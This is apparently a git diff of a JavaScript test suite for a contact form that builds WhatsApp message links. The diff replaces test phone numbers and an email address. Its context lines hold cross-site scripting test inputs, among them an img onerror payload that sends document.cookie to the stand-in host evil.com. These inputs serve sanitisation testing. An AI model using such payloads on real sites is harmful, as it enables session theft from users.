@@ -64,7 +64,7 @@ function runTier5Tests() {
       {
         lang: 'Kannada (Local Regional)',
         fullName: 'ಶ್ರೀನಿವಾಸ್ ಮೂರ್ತಿ',
-        phone: '+91 63647 68498',
+        phone: '+91 76766 90081',
         email: 'srinivas.murthy@tumkur.org',
         city: 'ತುಮಕೂರು, ಕರ್ನಾಟಕ',
         customerType: 'Business',
@@ -118,7 +118,7 @@ function runTier5Tests() {
       totalAsserts++;
 
       const waUrl = buildWhatsAppPayload(payload, config);
-      Assert.isTrue(waUrl.startsWith('https://wa.me/916364768498?text='), `WhatsApp URL format valid for ${payload.lang}`);
+      Assert.isTrue(waUrl.startsWith('https://wa.me/917676690081?text='), `WhatsApp URL format valid for ${payload.lang}`);
       Assert.contains(waUrl, encodeURIComponent(payload.fullName), `Full name safely URI encoded for ${payload.lang}`);
       Assert.contains(waUrl, encodeURIComponent(payload.city), `City safely URI encoded for ${payload.lang}`);
       Assert.contains(waUrl, encodeURIComponent(payload.description), `Description safely URI encoded for ${payload.lang}`);
@@ -133,7 +133,7 @@ function runTier5Tests() {
     const massiveText = 'Aarambhx Technology '.repeat(600) + '🔥🚀💻';
     const payload = {
       fullName: 'Enterprise Systems Architect',
-      phone: '+91 63647 68498',
+      phone: '+91 76766 90081',
       email: 'enterprise@corp.com',
       city: 'Tumakuru Tech Park',
       customerType: 'Office',
@@ -147,7 +147,7 @@ function runTier5Tests() {
     Assert.isTrue(valRes.isValid, 'Massive payload must validate without crash');
 
     const waUrl = buildWhatsAppPayload(payload, config);
-    Assert.isTrue(waUrl.startsWith('https://wa.me/916364768498?text='), 'Target WhatsApp URL prefix correct');
+    Assert.isTrue(waUrl.startsWith('https://wa.me/917676690081?text='), 'Target WhatsApp URL prefix correct');
     Assert.isGreaterThanOrEqual(waUrl.length, 10000, 'WhatsApp URL successfully encapsulates large payload');
     
     Assert.isFalse(waUrl.includes(' '), 'Encoded URL must have zero raw whitespace');
@@ -161,7 +161,7 @@ function runTier5Tests() {
     const maliciousPayloads = [
       {
         fullName: '<script>alert(document.cookie)</script>',
-        phone: '+91 63647 68498',
+        phone: '+91 76766 90081',
         email: 'attacker@evil.com',
         city: '<img src=x onerror="fetch(\'//evil.com/\'+document.cookie)">',
         customerType: 'Business',
@@ -368,14 +368,14 @@ function runTier5Tests() {
       '<script>alert(1)</script>',
       '12345.67890',
       '98450 12345 / 98450 67890',
-      'tel:6364768498'
+      'tel:7676690081'
     ];
 
     const validPhones = [
-      '+91 63647 68498',
-      '+916364768498',
-      '6364768498',
-      '+91 6364768498',
+      '+91 76766 90081',
+      '+917676690081',
+      '7676690081',
+      '+91 7676690081',
       '+1 555 1234567',
       '0816 2255888',
       '+44 20 7946095'
@@ -423,7 +423,7 @@ function runTier5Tests() {
 
     const validEmails = [
       '',
-      'lalithulalu@gmail.com',
+      'info@aarambhxtechnology.in',
       'lalithlalu.com@yahoo.com',
       'kiran.kumar+work@sit.ac.in',
       'user_123-test@sub.domain.org',
